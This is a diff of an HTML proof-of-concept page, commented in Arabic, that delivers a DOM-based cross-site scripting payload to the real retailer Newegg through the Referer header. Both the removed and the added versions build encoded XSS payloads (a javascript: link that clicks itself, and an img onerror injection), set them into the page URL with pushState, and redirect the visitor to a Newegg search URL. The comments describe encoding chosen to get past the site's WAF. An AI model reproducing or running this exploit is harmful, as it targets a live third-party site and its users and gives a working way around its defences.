@@ -3,33 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="referrer" content="unsafe-url">
-    <title>Security Research - PoC</title>
 </head>
-<body style="background:#000; color:#fff; text-align:center; padding-top:100px; font-family:sans-serif;">
-
-    <h1 style="color:lime;">VORTEX EXPLOIT SYSTEM</h1>
-    <p>Target: Newegg DOM-XSS</p>
-
-    <a id="attackLink" href="https://www.newegg.com/p/pl?d=Yasser&GroupEss209183=Mouad" 
-       style="padding:20px; background:lime; color:black; text-decoration:none; font-weight:bold; border-radius:5px; display:inline-block; cursor:pointer;">
-        CLICK TO START ATTACK 🚀
-    </a>
-
+<body>
     <script>
-        // البايلود الذي نجح معك في الكونسول
-        // نستخدم التشفير البسيط للـ Colon (:) لتجنب الـ WAF البدائي
-        var stealthProtocol = "javascript&#58;alert(document.domain)";
+        // هذا البايلود لا يحتوي على أي رموز تجذب انتباه الـ WAF
+        // سنستخدم التشفير لعلامات التنصيص والأقواس
+        var payload = "x%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E";
         
-        // بناء البايلود لكسر الـ href وحقن الرابط الجديد
-        // وضعنا id='x' وعملنا له .click() تلقائي بمجرد التحميل في نيوإيج
-        var payload = "\"> <a id='x' href='" + stealthProtocol + "'></a> <img src=x onerror='document.getElementById(`x`).click()'> <a x=\"";
+        // تغيير المسار بحيث يظهر للـ WAF كأنه مجرد كلمات عشوائية
+        window.history.pushState({}, '', "/search/v/" + payload);
 
-        // تحديث مسار الصفحة الحالية (GitHub) ليكون هو الـ Referrer
-        var attackPath = "/VORTEX/" + encodeURIComponent(payload);
-        window.history.pushState({}, '', attackPath);
-
-        // تنبيه بسيط
-        console.log("Payload ready in Referrer!");
+        function start() {
+            window.location.href = "https://www.newegg.com/p/pl?d=Yasser&GroupEss209183=Mouad";
+        }
     </script>
+    <button onclick="start()" style="padding:50px; font-size:30px;">CLICK TO BYPASS WAF</button>
 </body>
 </html>
